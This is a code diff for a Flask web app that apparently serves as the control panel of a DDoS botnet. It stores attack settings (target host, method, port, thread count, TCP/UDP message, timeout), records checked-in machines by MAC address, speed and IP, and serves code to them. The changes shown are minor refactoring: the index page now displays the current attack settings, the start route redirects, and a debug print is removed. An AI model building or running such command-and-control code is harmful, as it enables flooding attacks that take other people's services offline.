@@ -1,6 +1,6 @@
 import time
 
-from flask import render_template, request, jsonify
+from flask import render_template, request, jsonify, redirect, url_for
 
 from app import app, db
 from models import Attack, User, Code
@@ -10,6 +10,13 @@ from models import Attack, User, Code
 def index():
     users = User.query.all()
     last_seen_max = time.time() - 2 * 60
+    data = Attack.query.first()
+    if data:
+        fields = ('host', 'method', 'smart', 'timeout', 'msg_tcp_udp', 'port',
+                  'max_thread', 'percent')
+        data = {i: getattr(data, i) for i in fields}
+        return render_template('index.html', users=users,
+                               last_seen_max=last_seen_max, **data)
     return render_template('index.html', users=users,
                            last_seen_max=last_seen_max)
 
@@ -44,18 +51,7 @@ def start():
                     percent=percent)
     db.session.add(attack)
     db.session.commit()
-    return render_template('index.html',
-                           host=host,
-                           method=method,
-                           timeout=timeout,
-                           smart=smart,
-                           msg_tcp_udp=msg_tcp_udp,
-                           port=port,
-                           max_thread=max_thread,
-                           percent=percent,
-                           users=users,
-                           last_seen_max=last_seen_max,
-                           )
+    return redirect(url_for('index'))
 
 
 @app.route('/stop', methods=['GET', 'POST'])
@@ -75,7 +71,6 @@ def stop():
 def checkin(mac_address, internet_speed):
     user = User.query.filter_by(mac=mac_address).all()
     if len(user):
-        print(user[0])
         db.session.delete(user[0])
         db.session.commit()
     ip = request.remote_addr
@@ -116,4 +111,3 @@ def get_code():
     return jsonify({
         'code': code.code,
     })
-
